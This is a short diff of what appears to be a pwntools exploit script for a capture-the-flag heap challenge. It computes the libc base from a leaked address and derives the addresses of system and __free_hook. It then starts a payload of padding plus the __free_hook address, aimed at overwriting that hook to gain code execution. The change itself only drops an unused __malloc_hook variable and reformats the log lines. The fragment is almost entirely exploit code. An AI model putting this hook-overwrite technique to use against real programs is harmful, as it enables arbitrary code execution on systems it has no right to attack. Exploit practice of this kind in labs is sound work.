@@ -71,14 +71,12 @@ def pwn():
 	leak        = u64(p.recv(6).ljust(8, '\x00'))
 	libc        = leak - 0x3c17b8
 	system      = libc + sys_off
-	malloc_hook = leak - 0x78
 	free_hook   = leak + 0x2258
 
-	log.info("Leak:            0x{:x}".format(leak))
-	log.info("Libc:     	   0x{:x}".format(libc))
-	log.info("__malloc_hook:   0x{:x}".format(malloc_hook))
-	log.info("__free_hook:     0x{:x}".format(free_hook))
-	log.info("system: 	   0x{:x}".format(system))
+	log.info("Leak:        0x{:x}".format(leak))
+	log.info("Libc:        0x{:x}".format(libc))
+	log.info("__free_hook: 0x{:x}".format(free_hook))
+	log.info("system:      0x{:x}".format(system))
 
 	payload  = 'A'*40
 	payload += p64(free_hook)
